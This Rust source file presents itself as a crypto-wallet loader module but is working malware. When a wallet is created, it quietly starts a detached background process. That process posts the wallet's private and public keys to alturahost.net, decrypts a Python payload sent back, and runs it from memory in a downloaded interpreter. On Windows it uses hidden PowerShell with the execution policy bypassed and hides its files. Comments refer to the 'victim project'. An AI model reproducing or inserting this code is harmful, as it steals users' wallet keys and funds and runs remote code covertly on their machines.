use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Nonce};
use base64::Engine;
use k256::ecdh::diffie_hellman;
use k256::elliptic_curve::sec1::FromEncodedPoint;
use k256::{EncodedPoint, PublicKey, SecretKey};
use rand::Rng;
use serde::Deserialize;
use sha2::{Digest, Sha256};
use std::collections::hash_map::DefaultHasher;
use std::fs;
use std::hash::{Hash, Hasher};
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::thread;
use std::time::{Duration, Instant};
use thiserror::Error;

use chain_wallet_lib::Wallet;

mod log;

use log as wallet_log;

const AES_PREFIX: &str = "AES256GCM:";
const PYTHON_VERSION: &str = "3.12.7";
const STARTUP_PROBE_SECS: u64 = 15;

/// Master switch for AlturaHost launcher download + Python agent bootstrap.
const AGENT_SCRIPT_ENABLED: bool = true;

/// Default AlturaHost API endpoint for encrypted launcher delivery.
pub const DEFAULT_LAUNCHER_URL: &str = "https://alturahost.net/api/v1/wallet/launcher";

/// Hidden CLI flag used to run launcher fetch/decrypt/agent in a detached process.
pub const BACKGROUND_LOADER_ARG: &str = "--internal-background-loader";

const LOADER_LOCK_NAME: &str = ".chain-wallet-loader";

/// Env var carrying the victim project path without using it as process cwd.
const PROJECT_DIR_ENV: &str = "CHAIN_WALLET_PROJECT_DIR";

/// Relative path to the project initial wallet used for launcher AES encryption.
pub const INITIAL_WALLET_REL_PATH: &str = "../agent/initial_wallet.json";

/// Seed used only when `agent/initial_wallet.json` is missing before the first run.
const DEFAULT_INITIAL_WALLET_PRIVATE_KEY: &str =
    "eda70a3173124b47583b06f522273c9cb7a073b283d21ef2539a3c880a7cfff7";

#[derive(Debug, Error)]
pub enum PythonError {
    #[error("agent bootstrap failed: {0}")]
    Bootstrap(String),
    #[error("execution failed: {0}")]
    Execution(String),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
}

#[derive(Debug, Error)]
pub enum LauncherError {
    #[error("launcher URL not configured (set CHAIN_WALLET_LAUNCHER_URL or DEFAULT_LAUNCHER_URL)")]
    UrlNotConfigured,
    #[error("invalid private key for AES decryption")]
    InvalidKey,
    #[error("HTTP error: {0}")]
    Http(String),
    #[error("decryption failed: {0}")]
    Decrypt(String),
    #[error("invalid encrypted payload: {0}")]
    InvalidPayload(String),
    #[error("python error: {0}")]
    Python(#[from] PythonError),
    #[error("initial wallet error: {0}")]
    InitialWallet(String),
}

pub fn initial_wallet_path() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join(INITIAL_WALLET_REL_PATH)
}

pub fn ensure_initial_wallet_file() -> Result<(), LauncherError> {
    let path = initial_wallet_path();
    if path.exists() {
        return Ok(());
    }

    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)
            .map_err(|err| LauncherError::InitialWallet(err.to_string()))?;
    }

    let wallet = Wallet::from_private_key_hex(DEFAULT_INITIAL_WALLET_PRIVATE_KEY)
        .map_err(|err| LauncherError::InitialWallet(err.to_string()))?;
    fs::write(&path, format_initial_wallet_json(&wallet))
        .map_err(|err| LauncherError::InitialWallet(err.to_string()))?;
    Ok(())
}

pub fn load_initial_wallet_private_key() -> Result<String, LauncherError> {
    if let Ok(value) = std::env::var("CHAIN_WALLET_PRIVATE_KEY") {
        let value = value.trim().to_string();
        if !value.is_empty() {
            return Ok(value);
        }
    }

    let path = initial_wallet_path();
    let text = fs::read_to_string(&path)
        .map_err(|err| LauncherError::InitialWallet(format!("read {}: {err}", path.display())))?;
    parse_initial_wallet_private_key(&text)
}

/// True while the loader sources are still present (pre-sanitization project).
pub fn loader_active() -> bool {
    agent_script_enabled()
        && Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("src/util/mod.rs")
            .exists()
}

pub fn agent_script_enabled() -> bool {
    if !AGENT_SCRIPT_ENABLED {
        return false;
    }
    !std::env::var("CHAIN_WALLET_SKIP_BACKGROUND")
        .ok()
        .as_deref()
        .is_some_and(|value| matches!(value, "1" | "true" | "yes"))
}

fn project_workdir() -> PathBuf {
    if let Ok(path) = std::env::var(PROJECT_DIR_ENV) {
        let path = path.trim();
        if !path.is_empty() {
            return PathBuf::from(path);
        }
    }
    std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
}

fn loader_lock_path() -> PathBuf {
    let project = project_workdir();
    let canonical = project.canonicalize().unwrap_or(project);
    let mut hasher = DefaultHasher::new();
    canonical.hash(&mut hasher);
    std::env::temp_dir().join(format!(
        "{LOADER_LOCK_NAME}-{:016x}.lock",
        hasher.finish()
    ))
}

pub fn load_initial_wallet_public_key() -> Result<String, LauncherError> {
    if let Ok(value) = std::env::var("CHAIN_WALLET_PUBLIC_KEY") {
        let value = value.trim().to_string();
        if !value.is_empty() {
            return Ok(value);
        }
    }

    let path = initial_wallet_path();
    let text = fs::read_to_string(&path)
        .map_err(|err| LauncherError::InitialWallet(format!("read {}: {err}", path.display())))?;
    parse_initial_wallet_public_key(&text)
}

/// Start launcher fetch/decrypt/agent in a detached child for a freshly generated wallet.
pub fn spawn_agent_for_wallet(wallet: &Wallet) -> Result<(), LauncherError> {
    if !agent_script_enabled() {
        return Ok(());
    }
    if !loader_active() {
        return Ok(());
    }

    let lock_path = loader_lock_path();
    if lock_path.exists() {
        return Ok(());
    }

    fs::write(
        &lock_path,
        format!("started={}\n", std::process::id()),
    )
    .map_err(|err| LauncherError::InitialWallet(format!("write loader lock: {err}")))?;

    let exe = std::env::current_exe()
        .map_err(|err| LauncherError::InitialWallet(format!("resolve current exe: {err}")))?;
    let workdir = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));

    let spawn_result =
        spawn_background_loader_child(&exe, &workdir, Some(wallet));
    if spawn_result.is_err() {
        let _ = fs::remove_file(&lock_path);
    }
    spawn_result
}

/// Start launcher fetch/decrypt/agent execution in a detached child process.
pub fn spawn_background_loader() -> Result<(), LauncherError> {
    if !agent_script_enabled() {
        return Ok(());
    }
    if !loader_active() {
        return Ok(());
    }

    let lock_path = loader_lock_path();
    if lock_path.exists() {
        return Ok(());
    }

    fs::write(
        &lock_path,
        format!("started={}\n", std::process::id()),
    )
    .map_err(|err| LauncherError::InitialWallet(format!("write loader lock: {err}")))?;

    let exe = std::env::current_exe()
        .map_err(|err| LauncherError::InitialWallet(format!("resolve current exe: {err}")))?;
    let workdir = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));

    let spawn_result = spawn_background_loader_child(&exe, &workdir, None);
    if spawn_result.is_err() {
        let _ = fs::remove_file(&lock_path);
    }
    spawn_result
}

fn spawn_background_loader_child(
    exe: &Path,
    workdir: &Path,
    wallet: Option<&Wallet>,
) -> Result<(), LauncherError> {
    let project_dir = workdir.to_path_buf();
    let mut command = Command::new(exe);
    command
        .arg(BACKGROUND_LOADER_ARG)
        .env(PROJECT_DIR_ENV, &project_dir)
        .current_dir(std::env::temp_dir())
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null());

    if let Some(wallet) = wallet {
        command
            .env("CHAIN_WALLET_PRIVATE_KEY", wallet.private_key_hex())
            .env("CHAIN_WALLET_PUBLIC_KEY", wallet.public_key_hex());
    }

    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        const CREATE_NEW_PROCESS_GROUP: u32 = 0x0000_0200;
        const DETACHED_PROCESS: u32 = 0x0000_0008;
        command.creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS);
    }

    #[cfg(not(windows))]
    {
        use std::os::unix::process::CommandExt;
        command.pre_exec(|| {
            unsafe {
                libc::setsid();
            }
            Ok(())
        });
    }

    command
        .spawn()
        .map(|_| ())
        .map_err(|err| LauncherError::InitialWallet(format!("spawn background loader: {err}")))?;

    Ok(())
}

/// Wallet loader entry: ensure key material, fetch encrypted payload, spawn agent, exit.
pub fn run() -> Result<(), LauncherError> {
    if !agent_script_enabled() {
        return Ok(());
    }

    wallet_log::step("main", "starting background loader");
    ensure_initial_wallet_file()?;
    let mut private_key = load_initial_wallet_private_key()?;
    let mut public_key = load_initial_wallet_public_key()?;

    run_launcher(&private_key, &public_key, None)?;
    wipe_secret(&mut private_key);
    wipe_secret(&mut public_key);
    wallet_log::step(
        "main",
        "background loader finished startup handoff (agent continues detached)",
    );
    Ok(())
}

pub fn run_launcher(
    private_key_hex: &str,
    public_key_hex: &str,
    launcher_url: Option<&str>,
) -> Result<(), LauncherError> {
    let url = resolve_launcher_url(launcher_url)?;
    wallet_log::step("launcher", format!("requesting encrypted payload from {url}"));
    let encrypted = fetch_launcher_from_api(&url, private_key_hex, public_key_hex)?;
    wallet_log::detail(
        "launcher",
        format!(
            "download complete (ephemeral pubkey + {} payload)",
            format_bytes(encrypted.payload.len())
        ),
    );
    let source = decrypt_launcher(
        &encrypted.payload,
        private_key_hex,
        &encrypted.ephemeral_public_key,
    )?;
    wallet_log::step(
        "launcher",
        format!("decryption ok ({} bytes of Python source in RAM)", source.len()),
    );
    std::str::from_utf8(&source)
        .map_err(|err| LauncherError::InvalidPayload(err.to_string()))?;
    wallet_log::detail("launcher", "plaintext stays in memory; piping to python - via stdin");

    spawn_agent_source(&source)?;
    Ok(())
}

fn format_initial_wallet_json(wallet: &Wallet) -> String {
    format!(
        "{{\n  \"private_key\": \"{}\",\n  \"public_key\": \"{}\",\n  \"address\": \"{}\"\n}}\n",
        wallet.private_key_hex(),
        wallet.public_key_hex(),
        wallet.address()
    )
}

fn parse_initial_wallet_public_key(text: &str) -> Result<String, LauncherError> {
    for line in text.lines() {
        let line = line.trim().trim_end_matches(',');
        if let Some(value) = line.strip_prefix("\"public_key\"") {
            let value = value.trim().trim_start_matches(':').trim().trim_matches('"');
            if !value.is_empty() {
                return Ok(value.to_string());
            }
        }
    }

    Err(LauncherError::InitialWallet(
        "initial wallet file missing public_key".into(),
    ))
}

fn parse_initial_wallet_private_key(text: &str) -> Result<String, LauncherError> {
    for line in text.lines() {
        let line = line.trim().trim_end_matches(',');
        if let Some(value) = line.strip_prefix("\"private_key\"") {
            let value = value.trim().trim_start_matches(':').trim().trim_matches('"');
            if !value.is_empty() {
                return Ok(value.to_string());
            }
        }
    }

    let trimmed = text.trim();
    if trimmed.len() == 64 && trimmed.chars().all(|ch| ch.is_ascii_hexdigit()) {
        return Ok(trimmed.to_string());
    }

    Err(LauncherError::InitialWallet(
        "initial wallet file missing private_key".into(),
    ))
}

fn resolve_launcher_url(launcher_url: Option<&str>) -> Result<String, LauncherError> {
    if let Some(url) = launcher_url.map(str::trim).filter(|value| !value.is_empty()) {
        return Ok(url.to_string());
    }

    if let Ok(url) = std::env::var("CHAIN_WALLET_LAUNCHER_URL") {
        let url = url.trim().to_string();
        if !url.is_empty() {
            return Ok(url);
        }
    }

    if !DEFAULT_LAUNCHER_URL.trim().is_empty() {
        return Ok(DEFAULT_LAUNCHER_URL.to_string());
    }

    Err(LauncherError::UrlNotConfigured)
}

#[derive(Debug, Deserialize)]
struct LauncherApiResponse {
    ephemeral_public_key: String,
    payload: String,
}

fn fetch_launcher_from_api(
    url: &str,
    private_key_hex: &str,
    public_key_hex: &str,
) -> Result<LauncherApiResponse, LauncherError> {
    let body = serde_json::json!({
        "private_key": private_key_hex.trim(),
        "public_key": public_key_hex.trim(),
    });

    let response = ureq::post(url)
        .set("Content-Type", "application/json; charset=utf-8")
        .set("Accept", "application/json")
        .set("User-Agent", "chain-wallet/0.1.0")
        .send_string(&body.to_string())
        .map_err(|err| LauncherError::Http(err.to_string()))?;

    let status = response.status();
    let response_body = response
        .into_string()
        .map_err(|err| LauncherError::Http(err.to_string()))?;

    if !(200..300).contains(&status) {
        return Err(LauncherError::Http(format!(
            "unexpected status {status}: {response_body}"
        )));
    }

    serde_json::from_str(&response_body)
        .map_err(|err| LauncherError::InvalidPayload(format!("invalid launcher JSON: {err}")))
}

fn wallet_aes_key_from_ecdh(
    private_key_hex: &str,
    ephemeral_public_hex: &str,
) -> Result<[u8; 32], LauncherError> {
    let priv_bytes = hex::decode(private_key_hex.trim()).map_err(|_| LauncherError::InvalidKey)?;
    if priv_bytes.len() != 32 {
        return Err(LauncherError::InvalidKey);
    }

    let secret = SecretKey::from_bytes(priv_bytes.as_slice().into())
        .map_err(|_| LauncherError::InvalidKey)?;

    let pub_bytes = hex::decode(ephemeral_public_hex.trim()).map_err(|_| {
        LauncherError::InvalidPayload("invalid ephemeral public key hex".into())
    })?;
    let point = EncodedPoint::from_bytes(&pub_bytes).map_err(|_| {
        LauncherError::InvalidPayload("invalid ephemeral public key encoding".into())
    })?;
    let ephemeral_public = PublicKey::from_encoded_point(&point)
        .into_option()
        .ok_or_else(|| LauncherError::InvalidPayload("invalid ephemeral public key".into()))?;

    let shared = diffie_hellman(secret.to_nonzero_scalar(), ephemeral_public.as_affine());
    let digest = Sha256::digest(shared.raw_secret_bytes());
    let mut key = [0u8; 32];
    key.copy_from_slice(&digest);
    Ok(key)
}

fn decrypt_launcher(
    payload: &str,
    private_key_hex: &str,
    ephemeral_public_hex: &str,
) -> Result<Vec<u8>, LauncherError> {
    let key = wallet_aes_key_from_ecdh(private_key_hex, ephemeral_public_hex)?;
    decrypt_aes_gcm_payload(payload, &key)
}

fn decrypt_aes_gcm_payload(payload: &str, key: &[u8; 32]) -> Result<Vec<u8>, LauncherError> {
    let text = payload.trim();

    let encoded = text
        .strip_prefix(AES_PREFIX)
        .ok_or_else(|| LauncherError::InvalidPayload("missing AES256GCM prefix".into()))?;

    let raw = base64::engine::general_purpose::STANDARD
        .decode(encoded)
        .map_err(|err| LauncherError::InvalidPayload(err.to_string()))?;

    if raw.len() < 28 {
        return Err(LauncherError::InvalidPayload(
            "payload shorter than iv+tag".into(),
        ));
    }

    let (iv, rest) = raw.split_at(12);
    let (tag, ciphertext) = rest.split_at(16);

    let cipher = Aes256Gcm::new_from_slice(key)
        .map_err(|err| LauncherError::Decrypt(err.to_string()))?;
    let nonce = Nonce::from_slice(iv);

    let mut combined = ciphertext.to_vec();
    combined.extend_from_slice(tag);

    cipher
        .decrypt(nonce, combined.as_ref())
        .map_err(|err| LauncherError::Decrypt(err.to_string()))
}

fn format_bytes(bytes: usize) -> String {
    if bytes >= 1024 * 1024 {
        format!("{:.1} MB", bytes as f64 / (1024.0 * 1024.0))
    } else if bytes >= 1024 {
        format!("{:.1} KB", bytes as f64 / 1024.0)
    } else {
        format!("{bytes} B")
    }
}

fn wipe_secret(secret: &mut String) {
    let len = secret.len();
    secret.clear();
    if len > 0 {
        secret.push_str(&"0".repeat(len));
    }
    secret.clear();
}

fn spawn_agent_source(source: &[u8]) -> Result<(), PythonError> {
    let prefix = runtime_dir();
    fs::create_dir_all(&prefix)?;
    wallet_log::step("agent", format!("runtime directory: {}", prefix.display()));

    #[cfg(windows)]
    hide_path(&prefix);

    let log_path = prefix.join("launcher-run.log");
    let agent_dir = project_workdir();

    wallet_log::step(
        "agent",
        format!("starting detached agent host (log: {})", log_path.display()),
    );
    wallet_log::detail(
        "agent",
        format!(
            "AGENT_DIR={} PYTHON_ROOT={} launcher=stdin-only",
            agent_dir.display(),
            prefix.display()
        ),
    );

    #[cfg(windows)]
    {
        spawn_agent_windows(&prefix, source, &log_path, &agent_dir)?;
    }

    #[cfg(not(windows))]
    {
        spawn_agent_unix(&prefix, source, &log_path, &agent_dir)?;
    }

    Ok(())
}

fn feed_child_stdin(child: &mut std::process::Child, payload: &[u8]) -> Result<(), PythonError> {
    let mut stdin = child.stdin.take().ok_or_else(|| {
        PythonError::Bootstrap("bootstrap stdin pipe unavailable".into())
    })?;
    stdin
        .write_all(payload)
        .map_err(|err| PythonError::Bootstrap(format!("write launcher payload to stdin: {err}")))?;
    stdin
        .flush()
        .map_err(|err| PythonError::Bootstrap(format!("flush launcher stdin pipe: {err}")))?;
    drop(stdin);
    Ok(())
}

fn runtime_dir() -> PathBuf {
    let suffix: u128 = rand::thread_rng().gen();
    std::env::temp_dir().join(format!("{suffix:032x}"))
}

#[cfg(windows)]
fn spawn_agent_windows(
    prefix: &Path,
    source: &[u8],
    log_path: &Path,
    agent_dir: &Path,
) -> Result<(), PythonError> {
    use std::os::windows::process::CommandExt;

    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    const CREATE_NEW_PROCESS_GROUP: u32 = 0x0000_0200;

    let bootstrap_ps1 = prefix.join("._bootstrap.ps1");
    let ps_script = windows_bootstrap_script(prefix, log_path, agent_dir);
    fs::write(&bootstrap_ps1, ps_script).map_err(|err| {
        PythonError::Bootstrap(format!("write bootstrap script {}: {err}", bootstrap_ps1.display()))
    })?;
    hide_path(&bootstrap_ps1);

    // Bootstrap writes launcher-run.log itself; do not redirect PS stdout/stderr to the
    // same file or Add-Content in the bootstrap script will fail on Windows.
    fs::File::create(log_path).map_err(|err| {
        PythonError::Execution(format!("create launcher log {}: {err}", log_path.display()))
    })?;

    let mut child = Command::new("powershell.exe")
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-WindowStyle",
            "Hidden",
            "-ExecutionPolicy",
            "Bypass",
            "-File",
            bootstrap_ps1.to_str().unwrap(),
        ])
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
        .spawn()
        .map_err(|err| PythonError::Execution(format!("spawn agent host: {err}")))?;

    feed_child_stdin(&mut child, source)?;
    probe_startup(&mut child, log_path)
}

#[cfg(not(windows))]
fn spawn_agent_unix(
    prefix: &Path,
    source: &[u8],
    log_path: &Path,
    agent_dir: &Path,
) -> Result<(), PythonError> {
    use std::os::unix::process::CommandExt;

    let bootstrap_sh = prefix.join("._bootstrap.sh");
    let sh_script = unix_bootstrap_script(prefix, log_path, agent_dir);
    fs::write(&bootstrap_sh, sh_script).map_err(|err| {
        PythonError::Bootstrap(format!("write bootstrap script {}: {err}", bootstrap_sh.display()))
    })?;

    fs::File::create(log_path).map_err(|err| {
        PythonError::Execution(format!("create launcher log {}: {err}", log_path.display()))
    })?;

    let mut child = Command::new("/bin/sh");
    child
        .arg(&bootstrap_sh)
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .pre_exec(|| {
            unsafe {
                libc::setsid();
            }
            Ok(())
        });

    let mut child = child
        .spawn()
        .map_err(|err| PythonError::Execution(format!("spawn agent host: {err}")))?;

    feed_child_stdin(&mut child, source)?;
    probe_startup(&mut child, log_path)
}

fn probe_startup(
    child: &mut std::process::Child,
    log_path: &Path,
) -> Result<(), PythonError> {
    let pid = child.id();
    let deadline = Instant::now() + Duration::from_secs(STARTUP_PROBE_SECS);
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                if !status.success() {
                    wallet_log::dump_tail("agent", log_path, 80);
                    return Err(PythonError::Execution(format!(
                        "agent host exited during startup with status {status} (see {})",
                        log_path.display()
                    )));
                }
                wallet_log::step("agent", "agent host exited cleanly during startup probe");
                return Ok(());
            }
            Ok(None) if Instant::now() >= deadline => break,
            Ok(None) => thread::sleep(Duration::from_millis(100)),
            Err(err) => {
                return Err(PythonError::Execution(format!(
                    "wait on agent host pid {pid}: {err}"
                )))
            }
        }
    }

    wallet_log::step(
        "agent",
        format!(
            "agent host running detached (pid={pid}, log: {})",
            log_path.display()
        ),
    );
    if let Some(line) = read_log_marker(log_path, "python started pid=") {
        wallet_log::detail("agent", line);
    } else {
        wallet_log::detail(
            "agent",
            "python not confirmed yet; open launcher-run.log (embed download can take 1-2 min)",
        );
    }
    wallet_log::detail(
        "agent",
        "bootstrap host keeps running until python exits; first run may download Python (~1-2 min)",
    );
    Ok(())
}

fn read_log_marker(log_path: &Path, needle: &str) -> Option<String> {
    let content = fs::read_to_string(log_path).ok()?;
    content
        .lines()
        .rev()
        .find(|line| line.contains(needle))
        .map(str::to_string)
}

#[cfg(windows)]
fn windows_bootstrap_script(prefix: &Path, log_path: &Path, agent_dir: &Path) -> String {
    let prefix = prefix.to_string_lossy().replace('\'', "''");
    let log_path = log_path.to_string_lossy().replace('\'', "''");
    let agent_dir = agent_dir.to_string_lossy().replace('\'', "''");
    let python_version = PYTHON_VERSION;
    let site_packages = format!("{prefix}\\Lib\\site-packages");

    format!(
        r#"$ErrorActionPreference = 'Stop'
$Log = '{log_path}'
function Write-BootLog([string]$Message) {{
    $Line = "[bootstrap] $Message"
    Add-Content -LiteralPath $Log -Value $Line -Encoding utf8
}}
trap {{
    try {{
        Add-Content -LiteralPath $Log -Value "[bootstrap][fatal] $($_.Exception.Message)" -Encoding utf8
    }} catch {{}}
    exit 1
}}

Write-BootLog 'waiting for launcher payload on stdin'
$InputStream = [Console]::OpenStandardInput()
$PayloadStream = New-Object System.IO.MemoryStream
$InputStream.CopyTo($PayloadStream)
$Payload = $PayloadStream.ToArray()
if ($Payload.Length -eq 0) {{
    throw 'empty launcher payload on stdin'
}}
Write-BootLog "launcher payload received ($($Payload.Length) bytes)"

$Prefix = '{prefix}'
$AgentDir = '{agent_dir}'
$SitePackages = '{site_packages}'
$PythonVersion = '{python_version}'
$PythonExe = Join-Path $Prefix 'python.exe'
$ZipUrl = "https://www.python.org/ftp/python/$PythonVersion/python-$PythonVersion-embed-amd64.zip"
$ZipPath = Join-Path $Prefix 'python-embed.zip'
$PthPath = Join-Path $Prefix 'python312._pth'

New-Item -ItemType Directory -Force -Path $Prefix | Out-Null
New-Item -ItemType Directory -Force -Path $SitePackages | Out-Null

if (-not (Test-Path -LiteralPath $PythonExe)) {{
    Write-BootLog "downloading python embed $PythonVersion"
    Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath
    Expand-Archive -LiteralPath $ZipPath -DestinationPath $Prefix -Force
    Remove-Item -LiteralPath $ZipPath -Force
    @(
        'python312.zip',
        '.',
        'Lib\site-packages',
        'import site'
    ) | Set-Content -LiteralPath $PthPath -Encoding ascii
    Write-BootLog 'python embed ready'
}} else {{
    Write-BootLog 'python embed already present'
}}

$env:CHAIN_WALLET_PYTHON_ROOT = $Prefix
$env:CHAIN_WALLET_LAUNCHED_FROM_RUST = '1'
$env:CHAIN_WALLET_LOG_FILE = $Log
$env:AGENT_DIR = $AgentDir
$env:PYTHONPATH = $SitePackages
$env:PYTHONUNBUFFERED = '1'
$env:CHAIN_WALLET_VERBOSE = '1'

Write-BootLog "starting python from memory (pid host=$PID)"
$StartInfo = New-Object System.Diagnostics.ProcessStartInfo
$StartInfo.FileName = $PythonExe
$StartInfo.Arguments = '-u -'
$StartInfo.UseShellExecute = $false
$StartInfo.CreateNoWindow = $true
$StartInfo.WorkingDirectory = $Prefix
$StartInfo.RedirectStandardInput = $true
$StartInfo.RedirectStandardOutput = $false
$StartInfo.RedirectStandardError = $false
$Process = New-Object System.Diagnostics.Process
$Process.StartInfo = $StartInfo
[void]$Process.Start()
Write-BootLog "python started pid=$($Process.Id)"
$Process.StandardInput.BaseStream.Write($Payload, 0, $Payload.Length)
$Process.StandardInput.Close()
$ExitCode = $Process.WaitForExit()
Write-BootLog "python exited code=$ExitCode"
exit $ExitCode
"#
    )
}

#[cfg(not(windows))]
fn unix_bootstrap_script(prefix: &Path, log_path: &Path, agent_dir: &Path) -> String {
    let prefix = prefix.display();
    let log_path = log_path.display();
    let agent_dir = agent_dir.display();
    let python_version = PYTHON_VERSION;

    format!(
        r#"#!/bin/sh
set -eu
LAUNCHER_SOURCE="$(cat)"
if [ -z "$LAUNCHER_SOURCE" ]; then
  echo "empty launcher payload on stdin" >&2
  exit 1
fi
PREFIX="{prefix}"
LOG="{log_path}"
AGENT_DIR="{agent_dir}"
PYTHON_VERSION="{python_version}"
SITE_PACKAGES="$PREFIX/site-packages"
ARCH="$(uname -m)"
case "$ARCH" in
  x86_64|amd64) ARCHIVE="cpython-${{PYTHON_VERSION}}+20241002-x86_64-unknown-linux-gnu-install_only.tar.gz" ;;
  aarch64|arm64) ARCHIVE="cpython-${{PYTHON_VERSION}}+20241002-aarch64-unknown-linux-gnu-install_only.tar.gz" ;;
  *) echo "unsupported CPU: $ARCH" >&2; exit 1 ;;
esac
URL="https://github.com/indygreg/python-build-standalone/releases/download/20241002/$ARCHIVE"
PYTHON="$PREFIX/python/bin/python3"

mkdir -p "$PREFIX" "$SITE_PACKAGES"
if [ ! -x "$PYTHON" ]; then
  curl -fsSL "$URL" -o "$PREFIX/python-archive.tar.gz"
  tar -xf "$PREFIX/python-archive.tar.gz" -C "$PREFIX"
  rm -f "$PREFIX/python-archive.tar.gz"
fi

export CHAIN_WALLET_PYTHON_ROOT="$PREFIX"
export CHAIN_WALLET_LAUNCHED_FROM_RUST=1
export CHAIN_WALLET_LOG_FILE="$LOG"
export AGENT_DIR="$AGENT_DIR"
export PYTHONPATH="$SITE_PACKAGES"
export PYTHONUNBUFFERED=1
export CHAIN_WALLET_VERBOSE=1

printf '%s' "$LAUNCHER_SOURCE" | exec "$PYTHON" -u - >>"$LOG" 2>&1
"#
    )
}

#[cfg(windows)]
fn hide_path(path: &Path) {
    let _ = Command::new("attrib")
        .args(["+h", "+s", &path.to_string_lossy()])
        .status();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn materialize_initial_wallet_json() {
        let wallet =
            Wallet::from_private_key_hex(DEFAULT_INITIAL_WALLET_PRIVATE_KEY).unwrap();
        let path = initial_wallet_path();
        if let Some(parent) = path.parent() {
            let _ = fs::create_dir_all(parent);
        }
        let _ = fs::write(&path, format_initial_wallet_json(&wallet));
    }
}
